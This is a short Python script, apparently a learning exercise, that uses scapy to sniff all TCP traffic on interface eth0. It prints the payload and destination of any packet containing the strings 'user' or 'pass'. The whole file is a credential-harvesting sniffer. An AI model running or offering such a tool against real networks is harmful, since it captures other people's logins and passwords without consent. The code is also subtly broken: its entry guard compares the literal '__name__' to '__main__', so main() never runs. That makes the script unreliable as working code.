import scapy
from scapy.all import sniff
from scapy.layers.inet import TCP, IP
# -------------------------------------------------------------------
# No idea why TCP and IP weren't in scapy.all but whatever,
# the IDE helped us solve to problem. It's almost like that's
# what they're there for. Get familiar with the IDE you work with.
# -------------------------------------------------------------------


def packet_callback(packet):
    if packet[TCP].payload:
        mypacket = str(packet[TCP].payload)
        if 'user' in mypacket.lower() or 'pass' in mypacket.lower():
            print(f"[*] Destination: {packet[IP].dst}")
            print(f"[*] {str(packet[TCP].payload)}")


def main():
    while True:
        scapy.all.sniff(filter='tcp',
                        prn=packet_callback, store=0, iface='eth0', timeout=None)


if '__name__' == '__main__':
    main()
